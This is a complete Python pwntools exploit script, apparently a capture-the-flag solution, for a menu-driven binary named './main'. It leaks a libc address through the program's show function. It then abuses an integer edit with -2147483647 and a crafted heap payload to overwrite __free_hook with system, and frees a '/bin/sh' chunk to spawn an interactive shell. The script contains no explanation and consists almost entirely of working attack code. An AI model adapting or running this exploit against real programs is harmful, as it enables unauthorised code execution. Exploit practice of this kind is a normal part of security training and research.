#!/usr/bin/env python3
from pwn import *
context.update(os = 'linux', arch = 'amd64', log_level='debug')
p = process("./main")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=0)
ld = ELF("./ld-2.31.so",checksec=0)
def sl(choice): p.sendlineafter('> ',str(choice))
def checkid(id): p.sendlineafter('> ',str(id))
def add(id,length,name):
    sl(1)
    checkid(id)
    p.sendlineafter('> ',str(length))
    p.sendlineafter('> ',name)

def delete():
    sl(5)
def edit_name(id,name):
    sl(2)
    checkid(id)
    p.sendlineafter('> ',name)
def edit_number(id,number):
    sl(3)
    checkid(id)
    p.sendlineafter('> ',str(number))
def show():
    sl(4)

def main():
    add(0,1500,"A"*8)
    add(2,32,"B"*8)
    add(3,32,"C"*8)
    add(4,32,"D"*8)
    add(1,16,"E"*8)
    #-2147483647
    delete()
    add(2,64,"B"*7)
    show()
    p.recvuntil('BBBBBBB')
    print(p.recvline())
    leak = u64(p.recv(6).ljust(8,b"\x00"))
    print(hex(leak))
    base = leak - 0x1be060
    print(hex(base))
    one = base + libc.sym.system
    free_hook = base + libc.sym.__free_hook
    print(hex(one))
    print(hex(free_hook))
    add(4,32,"D"*8)
    edit_number(4,-2147483647)
    payload = flat(
        p64(0) * 5,
        p64(0x21),
        p64(0x32),
        p64(0x0000004000000000),
        p64(free_hook)
    )
    edit_name(4,payload)
    edit_name(2,p64(one))
    add(5,16,b"/bin/sh\x00")
    delete()
    p.interactive()


if __name__ == "__main__":
    main()
